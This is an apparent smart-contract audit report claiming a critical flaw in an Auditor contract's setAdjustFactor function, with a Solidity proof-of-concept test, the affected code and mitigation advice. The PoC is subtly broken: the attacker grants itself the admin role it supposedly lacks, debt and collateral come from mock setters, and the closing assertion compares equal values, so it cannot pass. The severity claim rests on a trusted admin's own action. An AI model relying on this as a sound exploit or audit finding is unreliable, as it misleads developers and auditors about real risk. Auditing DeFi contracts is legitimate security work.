# Critical Risk of System Insolvency Due to Manipulable adjustFactors

## Summary

The Auditor contract contains a critical vulnerability due to the ability of an ADMIN with the DEFAULT_ADMIN_ROLE to manipulate the adjustFactor for markets without any upper bounds. This can lead to severe systemic risks, including undercollateralized positions, ineffective liquidations, and potential system-wide insolvency.
## Vulnerability Detail
The vulnerability lies in the setAdjustFactor function, which allows the DEFAULT_ADMIN_ROLE to set the adjustFactor for any market. There are no upper limits on the adjustFactor, which means an ADMIN can set it to an extremely high value (e.g., 99%). This dramatically increases the borrowing power of users, allowing them to borrow far more than their collateral should permit.

PoC
```solidity
function testExploitAdjustFactor() external {
    // Step 1: Enable the market with a reasonable adjustFactor
    auditor.enableMarket(Market(address(market)), priceFeed, 0.8e18);
    
    // Step 2: DEFAULT_ADMIN_ROLE
    vm.prank(attacker);
    auditor.grantRole(auditor.DEFAULT_ADMIN_ROLE(), attacker);
    
    // Step 3: ADMIN sets an extremely high adjustFactor (e.g., 99%)
    vm.prank(attacker);
    auditor.setAdjustFactor(Market(address(market)), 0.99e18);
    
    // Step 4: ADMIN deposits a small amount of collateral (e.g., 100 tokens)
    market.setCollateral(100 ether);
    
    // Step 5: Attacker enters the market
    vm.prank(attacker);
    auditor.enterMarket(Market(address(market)));
    
    // Step 6: Attacker borrows almost the full value of their collateral (e.g., 99 tokens)
    vm.prank(attacker);
    market.setDebt(99 ether);
    
    // Validate the exploit
    (uint256 collateral, uint256 debt) = auditor.accountLiquidity(attacker, Market(address(0)), 0);
    assertEq(collateral, uint256(100 ether).mulWadDown(0.99e18));
   
    
    // Check if the position is undercollateralized
    assertTrue(collateral < debt);
}
 

```

## Impact
* Create massive undercollateralized positions: Users can borrow amounts significantly higher than their collateral, making the system highly vulnerable to small market fluctuations.
* Cause system-wide insolvency: The protocol may become insolvent due to the accumulation of bad debt from undercollateralized positions.
* Drain liquidity from the protocol: Malicious users can borrow excessively, leaving the protocol with insufficient funds to meet withdrawal demands.
* Render liquidations ineffective: The high adjustFactor makes it nearly impossible to liquidate positions in a timely manner, exacerbating the insolvency risk.


## Code Snippet
```solidity
/// @notice Sets the adjust factor for a certain market.
  /// @param market address of the market to change adjust factor for.
  /// @param adjustFactor adjust factor for the underlying asset.
  function setAdjustFactor(Market market, uint128 adjustFactor) public onlyRole(DEFAULT_ADMIN_ROLE) {
    if (!markets[market].isListed) revert MarketNotListed();

    markets[market].adjustFactor = adjustFactor;
    emit AdjustFactorSet(market, adjustFactor);
  }
```

## Tool used

Manual Review

## Recommendation

To mitigate this vulnerability, consider implementing the following measures:
Implement a maximum value for adjustFactor: Set an upper limit for the adjustFactor (e.g., 0.9e18 or 90%) to prevent excessive borrowing.
Require a time-lock or multi-sig process for adjusting critical parameters: Introduce a time-lock or multi-signature process for changing critical parameters like adjustFactor to prevent immediate and unilateral changes.
